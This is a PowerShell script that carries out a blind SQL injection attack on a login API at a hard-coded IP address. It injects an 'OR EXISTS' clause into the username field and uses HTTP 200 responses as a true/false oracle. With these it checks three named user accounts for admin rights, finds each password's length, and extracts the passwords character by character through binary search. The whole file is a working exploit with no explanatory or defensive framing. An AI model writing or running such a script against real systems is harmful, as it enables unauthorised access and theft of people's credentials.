param(
    [int]$MaxPasswordLength = 32,
    [int]$DelayMs = 150
)

$Target = 'http://45.79.200.170:3000/api/login'
$Users = @('devon.pearce', 'grant.whitfield', 'maria.holloway')

function Invoke-Oracle {
    param([string]$Condition)

    $payload = @{ username = "' OR EXISTS(SELECT 1 FROM users WHERE $Condition) -- "; password = 'x' } |
        ConvertTo-Json -Compress
    $status = & curl.exe -sS -o NUL -w '%{http_code}' -X POST $Target `
        -H 'Content-Type: application/json' --data-raw $payload
    Start-Sleep -Milliseconds $DelayMs
    return ($status.Trim() -eq '200')
}

foreach ($user in $Users) {
    Write-Host "[*] Checking role: $user"
    if (Invoke-Oracle "username='$user' AND role='admin'") {
        Write-Host "[!] ADMIN FOUND: $user; stopping as requested."
        break
    }

    $length = $null
    for ($n = 1; $n -le $MaxPasswordLength; $n++) {
        if (Invoke-Oracle "username='$user' AND length(password)=$n") {
            $length = $n
            break
        }
    }
    if ($null -eq $length) {
        Write-Host "[-] Password length not found for $user"
        continue
    }

    $password = ''
    for ($pos = 1; $pos -le $length; $pos++) {
        # Printable ASCII range; binary search uses one boolean request per bit.
        $lo = 32
        $hi = 126
        while ($lo -lt $hi) {
            $mid = [int][math]::Floor(($lo + $hi + 1) / 2)
            $condition = "username='$user' AND unicode(substr(password,$pos,1)) >= $mid"
            if (Invoke-Oracle $condition) { $lo = $mid } else { $hi = $mid - 1 }
        }
        $password += [char]$lo
        Write-Host ("    {0}/{1}: {2}" -f $pos, $length, $password)
    }
    Write-Host "[+] $user : $password"
}
